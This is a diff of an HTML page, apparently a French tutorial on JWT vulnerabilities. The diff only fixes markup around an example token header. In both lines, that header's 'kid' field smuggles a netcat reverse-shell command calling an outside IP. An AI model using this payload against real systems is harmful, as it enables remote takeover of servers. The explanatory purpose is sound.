@@ -370,7 +370,7 @@ Ainsi, la lecture d'un jeton avec ce header
 <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
 	</span><span class="nl">"alg"</span><span class="w"> </span><span class="p">:</span><span class="s2">"HS256"</span><span class="p">,</span><span class="w">
 	</span><span class="nl">"typ"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"JWT"</span><span class="p">,</span><span class="w">
-	</span><span class="nl">"kid"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><strike><span class="mi">2</strike><span class="w"> </span><span class="s2">"2; rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|nc 12.34.56.78 1234 &gt; f"</span><span class="w">
+	</span><span class="nl">"kid"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><strike><span class="mi">2</span></strike><span class="w"> </span><span class="s2">"2; rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|nc 12.34.56.78 1234 &gt; f"</span><span class="w">
 </span><span class="p">}</span><span class="w">
 </span></code></pre></div></div>
 
